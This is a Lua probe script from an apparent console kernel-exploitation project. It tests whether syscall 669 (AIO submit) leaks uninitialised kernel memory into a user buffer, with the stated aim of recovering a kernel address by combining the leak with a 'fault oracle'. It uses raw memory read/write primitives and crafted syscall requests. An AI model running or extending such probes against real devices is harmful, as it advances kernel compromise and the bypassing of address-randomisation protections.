-- CRASH_CLASS: LOW -- AIO batch submit only
-- PROBE 1370a: are the 16 bytes sys 669 writes into our destination deterministic?
--
-- 1369a (results/phase35_dead_end_reruns/1369a_sys669_tail_leak_20261109_123052.txt)
-- had every round of 669(cmd=1, reqs, 1, 1, ids) write 16 bytes of high-entropy data
-- into the request's destination, overriding a fill pattern of 0xA5/0x5A/0x33/0xCC/
-- 0x00/0xFF/0x77/0x11 without ever repeating one. No kernel-shaped value appeared.
--
-- Two very different explanations survive, and one run separates them:
--   deterministic for a fixed offset  -> the handler is returning request payload
--                                        (file or ciphertext); dead end, no leak
--   different every call at one offset -> uninitialised kernel memory is being copied
--                                        out; a 4-byte window of stale kernel stack is
--                                        an info leak, and with the fault oracle giving
--                                        the image's high dword per boot a leaked low
--                                        dword is a usable address
--
-- So: the same file offset eight times, then a different offset twice, then an
-- unmapped destination (to see whether the copy is gated on the destination at all).
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1369a_sys669_tail_leak_20261109_123052.txt
--   results/kernel_handlers/asm/sys_669_deep.asm (0x3b57c6..0x3b57ff)
--   probes/phase17_new_vectors/355a_aio_class.lua:61 (request struct)

print("=== PROBE 1370a: SYS 669 DETERMINISM ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok and v ~= nil then return to_num(v) end
    return nil
end
local function wd(addr, val) pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) pcall(function() memory.write_qword(addr, val) end) end
local function U(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end

local mk = make_syscall
local sc_open  = mk(5)
local sc_close = mk(6)

local path = "/app0/eboot.bin"
local name = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(name + i, 0) end
for i = 1, #path do wd(name + i - 1, string.byte(path, i)) end
local fd = to_num(sc_open(U(0, to_num(name)), U(0, 0), U(0, 0), U(0, 0), U(0, 0), U(0, 0)))
print(string.format("[0] %s -> fd=%d", path, fd))
if fd < 0 then print("=== PROBE 1370a ABORT: no fd ===") return end

local reqs = memory.alloc(0x100)
local ids  = memory.alloc(0x100)
local dest = memory.alloc(0x100)

local function zero(t)
    for i = 0, 0xFC, 4 do wd(t + i, 0) end
end

local function submit(off, dst)
    zero(reqs); zero(ids)
    for i = 0x10, 0x1C, 4 do wd(dest + i, 0xEE) end
    wq(reqs + 0x00, U(0, off))
    wq(reqs + 0x08, U(0, 0x10))
    wq(reqs + 0x10, U(0, dst))
    wq(reqs + 0x18, U(0, 0))
    wd(reqs + 0x20, fd)
    local rv = to_num(mk(669)(U(0, 1), U(0, to_num(reqs)), U(0, 1), U(0, 1), U(0, to_num(ids)), U(0, 0)))
    return rv
end

print("[A] same offset 0x1000, eight calls")
local first = nil
local same = 0
for r = 1, 8 do
    local rv = submit(0x1000, to_num(dest))
    local w0, w1, w2, w3 = rd(dest), rd(dest + 4), rd(dest + 8), rd(dest + 12)
    local sig = string.format("%08X%08X%08X%08X", w0 or 0, w1 or 0, w2 or 0, w3 or 0)
    if first == nil then first = sig elseif sig == first then same = same + 1 end
    print(string.format("[A%d] ret=%d  %s", r, rv, sig))
end
print(string.format("[A] identical repeats = %d/7", same))

print("[B] two calls at offset 0x2000")
for r = 1, 2 do
    local rv = submit(0x2000, to_num(dest))
    print(string.format("[B%d] ret=%d  %08X %08X %08X %08X", r, rv,
        rd(dest) or 0, rd(dest + 4) or 0, rd(dest + 8) or 0, rd(dest + 12) or 0))
end

print("[C] destination unmapped (0x1000)")
local rv = submit(0x1000, 0x1000)
print(string.format("[C] ret=%d", rv))

print("[D] destination null")
rv = submit(0x1000, 0)
print(string.format("[D] ret=%d", rv))

pcall(function() sc_close(U(0, fd), U(0, 0), U(0, 0), U(0, 0), U(0, 0), U(0, 0)) end)
print("=== PROBE 1370a COMPLETE ===")
